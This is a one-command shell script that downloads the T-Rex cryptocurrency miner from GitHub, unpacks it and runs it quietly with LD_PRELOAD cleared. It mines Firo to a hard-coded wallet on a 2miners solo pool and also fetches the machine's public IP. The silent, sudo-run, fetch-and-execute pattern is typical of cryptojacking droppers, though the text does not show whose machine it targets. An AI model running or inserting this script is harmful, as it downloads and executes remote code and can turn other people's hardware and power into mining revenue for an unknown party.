#!/bin/sh
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz && tar -xf t-rex-0.26.4-linux.tar.gz && chmod +x t-rex && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  LD_PRELOAD="" ./t-rex -a firopow -o stratum+tcp://solo-firo.2miners.com:9090 -u aEVwhv8dbjmVHCKZ48vyNY6nFqzeWAXT27 -p x -w PHPWAE -q
